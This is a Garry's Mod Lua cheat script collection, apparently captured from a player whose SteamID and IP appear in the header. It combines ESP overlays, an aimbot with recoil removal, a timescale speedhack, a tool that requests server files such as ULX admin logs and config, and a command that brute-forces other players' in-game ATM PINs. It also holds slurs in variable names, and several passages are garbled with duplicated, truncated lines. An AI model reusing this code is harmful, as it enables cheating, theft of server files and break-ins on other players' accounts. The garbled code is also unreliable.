--[[
	EXECUTABLE_PATH/scripts/lesp.lua
	-=TRR- is Up=Dayzlayer | STEAM_0:1:65860748 <86.169.139.24:27005> | [19-10-13 04:18:56PM]
	===BadFile===
]]

-- Lesp3
-- By Lixquid


lesp3 = {}
lesp3.version = 1
lesp3.s = {}

-- Framework Functions


concommand.Add( "lesp3_version", function()
	LocalPlayer():ChatPrint( "[Lesp3] Revision " .. lesp3.version )
end )

function lesp3.loadSettings()
	if file.Exists( "lesp3_settings.txt", "DATA" ) then
		local yay, nay = pcall( function() return util.JSONToTable( file.Read( "lesp3_settings.txt" ) ) end )
		if yay then
			lesp3.s = nay
		else
			print( "[Lesp3] " .. nay )
		end
	else
		print( "[Lesp3] Settings file doesn't exist" )
	end
end

function lesp3.saveSettings()
	file.Write( "lesp3_settings.txt", util.TableToJSON( lesp3.s ) )
end

local function drawText( text, font, x, y, color, alignx, aligny, outline, coloro )
	surface.SetFont( font )
	local w, h = surface.GetTextSize( text )
	surface.SetTextColor( coloro )
	x, y, outline = math.floor( x - ( ( alignx or 0 ) * w ) ), math.floor( y - ( ( aligny or 0 ) * h ) ), math.floor( outline )
	for i = -outline, outline do
		for j = -outline, outline do
			surface.SetTextPos( x + i, y + j )
			surface.DrawText( text )
		end
	end
	surface.SetTextColor( color )
	surface.SetTextPos( x, y )
	surface.DrawText( text )
end

-- PESP

do

lesp3.s.pesp = lesp3.s.pesp or {}
local s = lesp3.s.pesp
s.load = s.load or true
s.on = s.on or true
s.node = s.node or true
s.name = s.name or true
s.realname = s.realname or true
s.healthbar = s.healthbar or true
s.healthnum = s.healthnum or false
s.weapon = s.weapon or true
s.distance = s.distance or false
s.money = s.money or true
s.job = s.job or true

surface.CreateFont( "lesp3_pesp_text", { size = 14, weight = 700 } )

if s.load then
	hook.Add( "HUDPaint", "lesp3.pesp", function()
		if not s.on then return end
		for k, v in pairs( player.GetAll() ) do
			if v == LocalPlayer() then continue end
			if not v:Alive() then continue end
			local p = v:EyePos():ToScreen()
			if s.node then
				surface.SetDrawColor( v:GetFriendStatus() == "friend" and Color( 0, 255, 0 ) or Color( 0, 0, 0 ) )
				surface.DrawOutlinedRect( p.x - 6, p.y - 6, 13, 13 )
				surface.SetDrawColor( team.GetColor( v:Team() ) )
				surface.DrawOutlinedRect( p.x - 5, p.y - 5, 11, 11 )
				surface.DrawOutlinedRect( p.x - 4, p.y - 4, 9, 9 )
				surface.SetDrawColor( v:GetFriendStatus() == "friend" and Color( 0, 255, 0 ) or Color( 0, 0, 0 ) )
				surface.DrawOutlinedRect( p.x - 3, p.y - 3, 7, 7 )
				surface.SetDrawColor( v:IsSuperAdmin() and Color( 255, 0, 0 ) or v:IsAdmin() and Color( 0, 255, 0 ) or Color( 0, 0, 255 ) )
				surface.DrawRect( p.x - 2, p.y - 2, 5, 5 )
			end
			local y = p.y
			if s.name then
				drawText( v:Name(), "lesp3_pesp_text", p.x + 12, y, v:GetFriendStatus() == "friend" and Color( 100, 255, 100 ) or Color( 255, 255, 255 ), 0, 0.5, 1, Color( 0, 0, 0 ) )
				y = y + 14
			end
			if s.healthbar then
				surface.SetDrawColor( 0, 0, 0, 255 )
				surface.DrawRect( p.x + 12, y - 6, 52, 5 )
				surface.SetDrawColor( 0, 255, 0, 255 )
				surface.DrawRect( p.x + 13, y - 5, math.Clamp( v:Health() / 2, 0, 50 ), 3 )
				if v:Armor() > 0 then
					surface.SetDrawColor( 0, 0, 0, 255 )
					surface.DrawRect( p.x + 12, y - 2, 52, 5 )
					surface.SetDrawColor( 40, 80, 255, 255 )
					surface.DrawRect( p.x + 13, y - 1, math.Clamp( v:Armor() / 2, 0, 50 ), 3 )
				end
				y = y + ( s.healthnum and 0 or ( v:Armor() > 0 and 10 or 6 ) )
			end
			if s.healthnum then
				drawText( v:Health() .. " / " .. v:Armor(), "lesp3_pesp_text", p.x + 12 + ( s.healthbar and 55 or 0 ), y, Color( 255, 255, 255 ), 0, 0.5, 1, Color( 0, 0, 0 ) )
				y = y + 14
			end
			if s.weapon and v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() then
				drawText( v:GetActiveWeapon():GetPrintName(), "lesp3_pesp_text", p.x + 12, y, Color( 255, 255, 255 ), 0, 0.5, 1, Color( 0, 0, 0 ) )
				y = y + 14
			end
			if s.distance then
				drawText( math.floor( v:GetPos():Distance( LocalPlayer():GetPos() ) ), "lesp3_pesp_text", p.x + 12, y, Color( 255, 255, 255 ), 0, 0.5, 1, Color( 0, 0, 0 ) )
			end
			y = p.y
			if s.realname and v.SteamName then
				drawText( v:SteamName(), "lesp3_pesp_text", p.x - 12, y, Color( 255, 25y
			if s.realname and v.SteamName then
				drawText( v:SteamName(), "lesp3_pesp_text", p.x - 12, y, Color( 255, 255, 255 ), 1, 0.5, 1, Color( 0, 0, 0 ) )
				y = y + 14
			end
			if s.money and v.DarkRPVars and v.DarkRPVars.money then
				drawText( "$" .. v.DarkRPVars.money, "lesp3_pesp_text", p.x - 12, y, Color( 255, 255, 255 ), 1, 0.5, 1, Color( 0, 0, 0 ) )
				y = y + 14
			end
			if s.money and v.DarkRPVars and v.DarkRPVars.job then
				drawText( v.DarkRPVars.job, "lesp3_pesp_text", p.x - 12, y, Color( 255, 255, 255 ), 1, 0.5, 1, Color( 0, 0, 0 ) )
			end
			
		end
	end )
end

end

-- EESP

do

lesp3.s.eesp = lesp3.s.eesp or {}


end

-- XRAY

do

lesp3.s.xray = lesp3.s.xray or {}
local s = lesp3.s.xray
s.load = s.load or true
s.on = s.on or false
s.ply = s.ply or { 255, 0, 0, 0.5 }
s.prop = s.prop or { 255, 255, 0, 0.5 }
s.ent = s.ent or { 255, 255, 255, 0.5 }

-- SIXTH SENSE

do

lesp3.s.sixsense = lesp3.s.sixsense or {}
local s = lesp3.s.sixsense
s.load = s.load or true
s.on = s.on or true
s.names = s.names or true
s.friends = s.friends or true
s.fov = s.fov or 110
s.dropoff = s.dropoff or 2000
s.spectator = s.spectator or true

surface.CreateFont( "lesp3_sixsense_text", { size = 26, weight = 700 } )

if s.load then
	
	hook.Add( "HUDPaint", "lesp3.sixsense", function()
		
		local sev = 0
		local adm = {}
		local ply = {}
		local fr = {}
		
		for k, v in pairs( player.GetAll() ) do
			
			if v == LocalPlayer() then continue end
			if not s.friends and v:GetFriendStatus() == "friend" then continue end
			if v:EyePos():Distance( LocalPlayer():EyePos() ) > s.dropoff then continue end
			
			local tr = util.QuickTrace( v:EyePos(), LocalPlayer():EyePos() - v:EyePos(), { v, LocalPlayer() } )
			if tr.Hit then continue end
			
			local ang = math.acos( ( LocalPlayer():EyePos() - v:EyePos() ):DotProduct( v:EyeAngles():Forward() ) / math.abs( ( LocalPlayer():EyePos() - v:EyePos() ):Length() ) ) / math.pi * 360
			
			if ang < s.fov then
				if v:IsAdmin() then
					adm[#adm+1] = v:Nick()
					sev = 3
				elseif v:GetFriendStatus() == "friend" then
					fr[#fr+1] = v:Nick()
					sev = math.max( sev, 1 )
				else
					ply[#ply+1] = v:Nick()
					sev = math.max( sev, 2 )
				end
			end
			
		end
		
		if s.names then
			if #adm == 0 and #ply == 0 and #fr == 0 then
				drawText( "---", "lesp3_sixsense_text", ScrW() - 5, 0, Color( 255, 255, 255 ), 1, 0, 1, Color( 0, 0, 0 ) )
				return
			end
			local y = 0
			for _, v in pairs( adm ) do
				drawText( v, "lesp3_sixsense_text", ScrW() - 5, y, Color( 255, 90, 45 ), 1, 0, 1, Color( 0, 0, 0 ) )
				y = y + 26
			end
			for _, v in pairs( ply ) do
				drawText( v, "lesp3_sixsense_text", ScrW() - 5, y, Color( 240, 220, 80 ), 1, 0, 1, Color( 0, 0, 0 ) )
				y = y + 26
			end
			for _, v in pairs( fr ) do
				drawText( v, "lesp3_sixsense_text", ScrW() - 5, y, Color( 90, 255, 45 ), 1, 0, 1, Color( 0, 0, 0 ) )
				y = y + 26
			end
			
		else
			if sev == 3 then
				drawText( "An admin is watching!", "lesp3_sixsense_text", ScrW() - 5, 0, Clor( 0, 0, 0 ) )
				y = y + 26
			end
			
		else
			if sev == 3 then
				drawText( "An admin is watching!", "lesp3_sixsense_text", ScrW() - 5, 0, Color( 255, 90, 45 ), 1, 0, 1, Color( 0, 0, 0 ) )
			elseif sev == 2 then
				drawText( "Someone is watching.", "lesp3_sixsense_text", ScrW() - 5, 0, Color( 240, 220, 80 ), 1, 0, 1, Color( 0, 0, 0 ) )
			elseif sev == 1 then
				drawText( "A friend is watching.", "lesp3_sixsense_text", ScrW() - 5, 0, Color( 90, 255, 45 ), 1, 0, 1, Color( 0, 0, 0 ) )
			else
				drawText( "---", "lesp3_sixsense_text", ScrW() - 5, 0, Color( 255, 255, 255 ), 1, 0, 1, Color( 0, 0, 0 ) )
			end
		end
		
	end )
	
end

end

-- QUICKSCRIPTS

do

local tab = {}
concommand.Add( "lesp3_quick_stickykey", function( ply, com, args )
	local t = string.lower( table.concat( args, " " ) )
	if tab[ t ] then
		tab[ t ] = nil
		LocalPlayer():ConCommand( "-" .. t )
	else
		tab[ t ] = true
		LocalPlayer():ConCommand( "+" .. t )
	end
end )

concommand.Add( "+lesp3_quick_fasttoggle", function( ply, com, args )
	LocalPlayer():ConCommand( string.lower( table.concat( args, " " ) ), 1 )
end )
concommand.Add( "-lesp3_quick_fasttoggle", function( ply, com, args )
	LocalPlayer():ConCommand( string.lower( table.concat( args, " " ) ), 0 )
end )

concommand.Add( "lesp3_quick_disablecamera", function( ply, com, args )
	if not LocalPlayer():GetActiveWeapon() or not LocalPlayer():GetActiveWeapon():IsValid() or LocalPlayer():GetActiveWeapon():GetClass() ~= "gmod_camera" then print( "[Lesp3] Weapon is not camera" ) end
	LocalPlayer():GetActiveWeapon().PrimaryAttack = LocalPlayer():GetActiveWeapon().DoShootEffect
end )

local tab_delay = {}
local tab_next = {}
concommand.Add( "+lesp3_quick_spam", function( ply, com, args )
	args[ #args ] = nil
	local del = args[ #args ]
	args[ #args ] = nil
	local run = string.lower( table.concat( args, " " ) )
	tab_delay[ run ] = del
	tab_next[ run ] = 0
end )
concommand.Add( "-lesp3_quick_spam", function( ply, com, args )
	args[ #args ] = nil
	local del = args[ #args ]
	args[ #args ] = nil
	local run = string.lower( table.concat( args, " " ) )
	tab_delay[ run ] = nil
end )
hook.Add( "Think", "lesp3.quick.spam", function()
	for k, v in pairs( tab_delay ) do
		if RealTime() > tab_next[ k ] then
			LocalPlayer():ConCommand( k )
			tab_next[ k ] = RealTime() + v
		end
	end
end )

if LocalPlayer().SteamName and LocalPlayer():Name() ~= LocalPlayer():SteamName() then
	RunConsoleCommand( "rp_name", LocalPlayer():SteamName() )
end
hook.Add( "InitPostEntity", "lesp3.quick.rpname", function()
	if LocalPlayer().SteamName and LocalPlayer():Name() ~= LocalPlayer():SteamName() then
		RunConsoleCommand( "rp_name", LocalPlayer():SteamName() )
	end
	hook.Remove( "InitPostEntity", "lesp3.quick.rpname" )
end )

concommand.Add( "lesp3_com_rotate1", function()
	LocalPlayer():SetEyeAngles( Angle( -EyeAngles().p, EyeAngles().y + 180, 0 ) )
end )
concommand.Add( "lesp3_com_rotate2", function()
	LocalPlayer():SetEyeAngles( Angle( -EyeAngles().p, EyeAngles().y + 180, 0 ) )
	RunConsoleCommand( "+jump" )
	timer.Simple( 0.1, RunConsoleCommand, "-jump" )
end )

end

-- TEMP

hook.Add( "InitPostEntity", "lesp3.quick.loads", function()
	lesp3.loadSettings()
	hook.Remove( "InitPostEntity", "lesp3.quick.loads" )
end )
lesp3.loadSettings()

for name, tab in pairs( lesp3.s ) do
	for setname, val in pairs( tab ) do
		concommand.Add( "lesp3_s_" .. name .. "_" .. setname, function( ply, com, args )
			lesp3.s[ name ][ setname ] = args[1]
			lesp3.saveSettings()
		end )
	end
end







local te = table.Empty
local concommand = concommand
local util = util
local player = player
local table = table
 
local CreateClientConVar = CreateClientConVar
 
local var = CreateClientConVar("shit_fov", 0, true, false);  
local as = CreateClientConVar("shit_as",1,true,false)
local enabled = CreateClientConVar('shit_enable',1,true,false)
local ateam = CreateClientConVar('shit_aim_ignoreteam',0,true,false)
local shitf = CreateClientConVar('shit_aim_friends',0,true,false)
local shittb = CreateClientConVar('shit_tb',0,true,false)
local shitsh = CreateClienteClientConVar('shit_aim_friends',0,true,false)
local shittb = CreateClientConVar('shit_tb',0,true,false)
local shitsh = CreateClientConVar('shit_antispawn',1,true,false)
local shitof = CreateClientConVar('shit_aim_offset',-5)
 
 
local Shit = {};
Shit.Aimspots = {
        "head",
        "forward",
        "eyes",
};
       
Shit.Aiming = false;
 
 
       
function Shit:GetHeadPos( e )
        for _, v in pairs( self.Aimspots ) do
        if IsValid(e) then
                if( e:GetAttachment( e:LookupAttachment( v ) ) ) then
                        return( e:GetAttachment( e:LookupAttachment( v ) ).Pos + Vector(0,0,shitof:GetInt())  );
                end
        end
end
end    
function Shit:IsVisible( e )
        local trace = {
                start = LocalPlayer():GetShootPos(),
                endpos = self:GetHeadPos( e ),
                filter = { e, LocalPlayer() },
                mask = MASK_SHOT
        };
        local tr = util.TraceLine( trace );
        return( tr.Fraction == 1.0 );
end
 
 
function Shit:Prediction( e, vec ) //Hermes v2
/*local view = Vector( 0, 0, 0 );
local fps = RealFrameTime() / 66;
local vel = e:GetVelocity() - LocalPlayer():GetVelocity();
view.x = vec.x + fps * vel.x;
view.y = vec.y + fps * vel.y;
view.z = vec.z + fps * vel.z;
return view;*/
if IsValid(e) then
return( vec + ( e:GetVelocity() * ( RealFrameTime() / 25 ) - ( LocalPlayer():GetVelocity() * ( RealFrameTime() / 66 ) ) ) );
end
end
 
function Shit:NormalizeAngles( ang )
        ang.p = math.NormalizeAngle( ang.p );
        ang.y = math.NormalizeAngle( ang.y );
        ang.r = 0;
        return ang;
end
 
function Shit:RemoveRecoil( u )
        local pang = u:GetViewAngles() - LocalPlayer():GetPunchAngle();
        self:NormalizeAngles( pang );
        u:SetViewAngles( pang );
end
 
local function FOVRestrict(v, value)
 
        return LocalPlayer():GetAimVector():DotProduct( (v:GetPos() - LocalPlayer():GetPos()):GetNormal() ) > value
end
 
function Shit:Aimbot( u )
 
if enabled:GetBool() then
        if( !self.Aiming ) then
                return;
        end
        for _, v in pairs( player.GetAll() ) do
                if( v == LocalPlayer() ||
                !self:IsVisible( v ) ||
                !v:Alive() ||
                v:InVehicle() ||
                v:GetMoveType() == MOVETYPE_OBSERVER ||
                GetConVar( "sbox_noclip" ):GetInt() == 0 && v:GetMoveType() == MOVETYPE_NOCLIP) then
                        continue;
                end
               
                if ateam:GetBool() and v:Team() == LocalPlayer():Team() then
                        continue
                end
               
                if !shitf:GetBool() and v:GetFriendStatus() == "friend" then
                continue
                end
               
                if shitsh:GetBool() and v:GetColor().a == 200 then
                continue
                end
 
                if(!FOVRestrict(v, var:GetFloat())) then
                        continue;
                end    
               
                if v:Health() < 0 then continue
                end
               
                       
                local pos = self:GetHeadPos( v );
                pos = self:Prediction( v, pos );
                local angl = ( pos - LocalPlayer():GetShootPos() ):Angle();
                self:NormalizeAngles( angl );
                self:RemoveRecoil( u );
                u:SetViewAngles( angl );
       
               
                if as:GetBool() then u:SetButtons( bit.bor( u:GetButtons(), IN_ATTACK ) )
        end
end
end
end
concommand.Add( "+aimbot", function() Shit.Aiming = true end );
concommand.Add( "-aimbot", function() Shit.Aiming = false end );
 
local function HookCreateMove( u )
        Shit:Aimbot( u );
end
hook.Add( "CreateMove", "nrc", HookCreateMove );
 
wep = _G.LocalPlayer():GetActiveWeapon();
if( _G.IsValid( wep ) ) then
if( wep.Primary ) then
wep.Primary.Recoil = 0.0
end
if( wep.Secondary ) then
wep.Secondary.Recoil = 0.0
end
end
 
 




 
 
 
function table.Empty(tbl)
        if tbl == debug.getregist( wep.Secondary ) then
wep.Secondary.Recoil = 0.0
end
end
 
 




 
 
 
function table.Empty(tbl)
        if tbl == debug.getregistry() or tbl == _G then return
        MsgC(Color(100,100,255),"Crash attempt blocked\n")
end
 te(tbl)
end

concommand.Add('col', function()
        print(LocalPlayer():GetColor().a)
end)









local lead
 
local alexisnoob = CreateClientConVar("alex_is_a_noob",3.0)

concommand.Add("+alexisabignoob", function()
RunConsoleCommand("sp00f_bs_host_timescale",alexisnoob:GetFloat())
end)

concommand.Add("-alexisabignoob", function()
RunConsoleCommand("sp00f_bs_host_timescale",1.0)
end)
















local dimavgui = vgui.Create
local dimarcc = RunConsoleCommand

require("up")

local function dimadl()
local dimaframe = dimavgui("DFrame")
dimaframe:SetSize(400,100)
dimaframe:Center()
dimaframe:SetTitle("dima downloader")
dimaframe:MakePopup()

local dimapath = dimavgui("DTextEntry", dimaframe)
--dimapath:SetPos(25,50)
dimapath:SetSize(350,20)
dimapath:Center()
dimapath:SetText("")
dimapath.OnEnter = function(self)
	MsgC(Color(0,255,0),'Requesting ' .. self:GetValue() ..'\n')
	RequestFile(self:GetValue())
	dimarcc("net_showfragments",1)
end

local dimapast = dimavgui("DButton",dimaframe)
dimapast:SetText("Yesterday")
dimapast:SetPos(24,70)
dimapast:SetSize(60,20)
dimapast.DoClick = function()
local date = tonumber(os.date("%d")) -1 
MsgC(Color(0,255,0),"data/ulx_logs/"..os.date("%m-")..date..os.date("-%y")..".txt\n")
RequestFile("data/ulx_logs/"..os.date("%m-")..date..os.date("-%y")..".txt")
end

local dimapresent = dimavgui("DButton",dimaframe)
dimapresent:SetText("Present")
dimapresent:SetPos(315,70)
dimapresent:SetSize(60,20)
dimapresent.DoClick = function()
MsgC(Color(0,255,0),"downloading present files ["..os.date("%m-%d-%y").."]\n")
RequestFile("data/ulx_logs/"..os.date("%m-%d-%y")..".txt")
end

local dimaconfig = dimavgui("DButton",dimaframe)
dimaconfig:SetText("Config")
dimaconfig:SetPos(170,70)
dimaconfig:SetSize(60,20)
dimaconfig.DoClick = function()
MsgC(Color(0,255,0),"downloading config\n")
RequestFile("data/ulx/config.txt")
end

end

local lastdimadownload = CurTime() +2

concommand.Add("alex_dl", dimadl)














local function hitfinder(targ,client)
MsgC(Color(0,255,0),client:Nick() .. " has put a hit on " .. targ:Nick() .. "\n")
chat.AddText(Color(0,255,0),"[Hit Detector] ".. client:Nick().." has placed a hit on " .. targ:Nick())
end

hook.Add("onHitAccepted","noob",hitfinder)

local imtheadmin = CreateClientConVar("nerd_fag",0,true,false)

local function zombies()
if imtheadmin:GetBool() then
RunConsoleCommand("act","zombie")
end
end
















timer.Create("noob",1,0,zombies)

local imtheadmin = CreateClientConVar("nerd_gay",0,true,false)

local function robot()
if imtheadmin:GetBool() then
RunConsoleCommand("act","robot")
end
end

timer.Create("noobrobot",1,0,robot)











concommand.Add( "hack_a_noob", function( ply, cmd, args )
 
        local i = 0;
        local to = 9999;
        local uid = 0;
 
        if ( args[ 1 ] && tonumber( args[ 1 ] ) ) then
 
                uid = tostring( args[ 1 ] );
 
        end
 
        if ( args[ 2 ] && tonumber( args[ 2 ] ) ) then
 
                i = tonumber( args[ 2 ] );
 
        end
 
        if ( args[ 3 ] && tonumber( args[ 3 ] ) ) then
 
                to = tonumber( args[ 3 ] );
 
        end
 
        if ( !concommand.GetTable()[ "rp_atm_account" ] ) then
 
                LocalPlayer():ChatPrint( "no concommand" );
 
        else
 
                local old = concommand.GetTable()[ "rp_atm_account" ];
 
                concommand.GetTable()[ "rp_atm_account" ] = function( ply, cmd, args )
 
                        if ( hook.GetTable()[ "CreateMove" ][ "garryisgay" ] ) then
 
                                hook.Remove( "CreateMove", "garryisgay" );
 
                                if ( args[ 1 ] ) then
 
                                        local crc = args[ 1 ];
 
                                        // Account for lag
                                        while ( util.CRC( i ) != crc ) do
 
        ] ) then
 
                                        local crc = args[ 1 ];
 
                                        // Account for lag
                                        while ( util.CRC( i ) != crc ) do
 
                                                i = i - 1;
                                                if ( i <= 0) then break; end -- failsafe
 
                                        end
 
                                        LocalPlayer():ChatPrint( uid .. ": PIN = " .. i .. " CRC = " .. crc );
                                        SetClipboardText(i)
 
 
                                else
 
                                        LocalPlayer():ChatPrint( "bad args" );
 
                                end
 
                        end
 
                        old( ply, cmd, args );
 
                end    
 
                hook.Add( "CreateMove", "garryisgay", function()
 
                        if ( i >= to ) then
 
                                LocalPlayer():ChatPrint( "pass not found in range" );
                                hook.Remove( "CreateMove", "garryisgay" );
                                return;
 
                        end
 
                        RunConsoleCommand( "rp_atm_login", util.CRC( i ), uid );
                        i = i + 1;
 
                end);
 
        end
 
end);
 
 
local function getinfo(ply,cmd,args)
 
        if (args) then
        print(args[1])
        SetClipboardText(Player(args[1]):UniqueID())
        end
end
 
concommand.Add("rp_un",getinfo)